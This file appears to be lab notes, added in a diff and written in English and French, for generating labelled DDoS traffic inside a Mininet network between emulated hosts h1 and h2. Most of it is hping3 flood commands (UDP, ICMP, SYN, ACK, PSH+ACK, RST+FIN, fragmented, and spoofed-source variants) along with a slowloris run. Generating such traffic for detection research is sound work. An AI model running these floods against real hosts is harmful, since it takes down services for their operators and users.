@@ -1,0 +1,112 @@
+mounting : sudo mount -t fuse.vmhgfs-fuse .host:/seetupforLinux /mnt/hgfs/shared -o allow_other
+listening on h1 tcpdump:mnexec -a $(pgrep -f h1) tcpdump -i h1-eth0 -n
+arp assingement: h1 arp -s 172.18.0.102 <MAC-of-h2>
+attacks:
+1. DDoS-UDP_Flood
+
+hping3 -2 -p 80 -i u1000 --data 120 h2
+
+2. DDoS-UDP_Fragmentation
+
+Simulate fragmented UDP payload:
+
+hping3 -2 -p 80 -i u1000 --data 1400 --frag h2
+
+3. DDoS-ICMP_Fragmentation
+
+hping3 -1 -i u1000 --data 1400 --frag h2
+
+4. DDoS-ACK_Fragmentation
+
+hping3 -A -p 80 -i u1000 --data 1400 --frag h2
+
+5. DDoS-RSTFINFlood
+
+Send packets with both RST and FIN flags:
+
+hping3 -R -F -p 80 -i u1000 h2
+
+6. DDoS-PSHACK_Flood
+
+Send packets with PSH and ACK flags:
+
+hping3 -PA -p 80 -i u1000 h2
+
+7. DDoS-SlowLoris
+
+This requires a different tool (slowloris.py). Install it:
+
+git clone https://github.com/gkbrk/slowloris
+cd slowloris
+python3 slowloris.py h2
+
+Or rate-limit by using:
+
+python3 slowloris.py h2 -s 100
+
+8. Benign Traffic (Control/Test Normal)
+
+Send regular TCP SYN at 1000/sec:
+
+hping3 -S -p 80 -i u1000 h2
+
+Or normal ping:
+
+hping3 -1 -i u1000 h2
+
+
+
+
+/////////////////////////////////////////////////////////////////////////////////////////
+
+0. BenignTraffic	mininet> h1 hping3 -1 -i u100000 -c 100 h2
+Envoie 100 pings ICMP à 10 Hz (trafic “normal”). no
+
+1. DDoS-ACK_Fragmentation	mininet> h1 hping3 -A -p 80 --frag -i u1000 --flood h2
+Flood ACK (flag A) + fragmentation IP.
+
+2. DDoS-HTTP_Flood	mininet> h1 hping3 -S -P -p 80 -d 120 --flood h2
+SYN+PSH sur port 80 avec 120 octets de payload.
+
+3. DDoS-ICMP_Flood	mininet> h1 hping3 -1 -i u1000 --flood h2
+ICMP flood à 1000 pps.
+
+4. DDoS-ICMP_Fragmentation	mininet> h1 hping3 -1 --frag -i u1000 --flood h2
+ICMP flood + fragmentation IP.
+
+5. DDoS-PSHACK_Flood	mininet> h1 hping3 -P -A -p 80 --flood h2
+Flood PSH+ACK (flags P et A) sur port 80.
+
+6. DDoS-RSTFINFlood	mininet> h1 hping3 -R -F -p 80 --flood h2
+Flood RST+FIN (flags R et F) sur port 80.
+
+7. DDoS-SYN_Flood	mininet> h1 hping3 -S -p 80 --flood h2
+SYN flood sur port 80.
+
+8. DDoS-SlowLoris	mininet> h1 hping3 -S -p 80 -d 1 -i u300000 h2
+Envoie un octet avec SYN toutes les 0.3 s.
+
+9. DDoS-SynonymousIP_Flood	mininet> h1 hping3 -S -p 80 --rand-source --flood h2
+SYN flood avec IP source aléatoire.
+
+10. DDoS-TCP_Flood	mininet> h1 hping3 -p 80 --flood h2
+Flood TCP “générique” (default = SYN).
+
+11. DDoS-UDP_Flood	mininet> h1 hping3 -2 -p 80 --flood h2
+UDP flood sur port 80.
+
+12. DDoS-UDP_Fragmentation	mininet> h1 hping3 -2 -p 80 --frag --flood h2
+UDP flood + fragmentation IP.
+
+
+
+
+
+
+
+
+
+
+
+
+
